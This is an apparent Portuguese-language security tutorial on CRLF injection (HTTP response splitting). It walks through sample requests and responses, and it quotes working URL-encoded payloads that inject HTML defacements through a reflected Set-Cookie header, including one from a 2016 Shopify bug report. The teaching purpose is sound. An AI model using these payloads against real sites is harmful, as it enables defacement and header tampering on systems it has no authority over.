# Carriage Return Line Feed

### O que é:

A partir desta vulnerabilidade será muito importante o leitor entender bem o funcionamento da web, então caso ainda esteja com dúvidas, releia os artigos sobre o [Protocolo HTTP](Protocolo%20HTTP-HTTPS.md), e o [Cliente-Servidor na web](Cliente-Servidor%20na%20WEB.md), feito isto, vamos à  vulnerabilidade.

O CRLF são caracteres usados para pular linhas, eles correspondem respectivamente, ao fim de uma linha e o início de outra para muitos protocolos, incluindo o HTTP, nele estes caracteres são representados por %0D %0A eles são, respectivamente, \r \n.

Achar esta vulnerabilidade é um pouco difícil pois o atacante deve estar atento as requests e responses mas caso consiga encontrá-la ele pode desde modificar uma response até criar um Firewall Evasion, que é quando o atacante consegue burlar verificações de segurança.

### Funcionamento Técnico:

Esta vulnerabilidade ocorre quando o atacante injeta um código no cabeçalho da request e este valor é "refletido" no cabeçalho da response, assim, quando é feita a injeção de caracteres CRLF ele pode criar sua própria response, conseguindo assim até criar uma página html inteira.

O local em que mais se encontra este problema é no cabeçalho Set-Cookie da response, mas ele pode ser encontrado em outros locais.

Imagine que ao inserir seus dados em um input você envie uma request parecida com esta para o servidor:


```http
GET /destino.php?nome=teste HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/home.html
Upgrade-Insecure-Requests: 1
```
e o servidor devolva esta response:

```http
HTTP/1.1 200 OK
Date: Fri, 15 May 2020 13:54:45 GMT
Server: Apache/2.4.41 (Debian)
Set-Cookie: Cookie=teste; expires=Fri, 15-May-2020 13:54:47 GMT; Max-Age=2
Content-Length: 18
Connection: close
Content-Type: text/html; charset=UTF-8

Hello World!
```
Percebido que nome == Cookie, você pode injetar crlf para gerar uma uma quebra de linha, inserindo assim, o que você quiser abaixo de Cookie.

Exemplo:

```http
GET /destino.php?nome=teste%0d%0a%0d%0a%3Chtml%3E%3Cbody%3EVoce%20foi%20hackeado%3C%2Fbody%3E%3C%2Fhtml%3E HTTP/1.1
Host: 192.168.15.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.15.9/home.html
Upgrade-Insecure-Requests: 1
```
response:
```http
HTTP/1.1 200 OK
Date: Fri, 15 May 2020 14:00:07 GMT
Server: Apache/2.4.41 (Debian)
Set-Cookie: Cookie=teste

<html><body>Voce foi hackeado></body</html>; expires=Fri, 15-May-2020 14:00:09 GMT; Max-Age=2
Content-Length: 65
Connection: close
Content-Type: text/html; charset=UTF-8

Hello World!
```
### Exemplo:

Este report foi feito em 2016 para a empresa shopify, nele o pesquisador percebeu que a ultima url que ele tinha acessado era refletida no cookie, então caso injetasse um código crlf seria possível modificar a response.

A url vulnerável era esta: https://v.shopify.com/last_shop?shop=krankopwnz.myshopify.com 

O pesquisador injetou ```%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20te\
xt/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>deface</html>``` após o fim da url, gerando assim uma página com o deface.

PoC:![](https://i.imgur.com/0lEiNeb.png)

### Como explorar:

Para explorar esta vulnerabilidade o pesquisador deve estar atento as requests e as responses da aplicação, para perceber quando alguns parâmetros estão sendo refletidos, para então, tentar montar um payload.

Acima, comentei que este erro é encontrado bastante no set-cookie, mas ele também pode ser encontrado no header Location e no header da request, de modo a editá-la antes de enviar ao servidor.

É interessante notar que esta vulnerabilidade pode gerar problemas como HTML Injection, Cross-Site Scripting e erros de logs no servidor, logo para extrair o máximo deste problema, esteja atento a tudo que ele pode afetar.
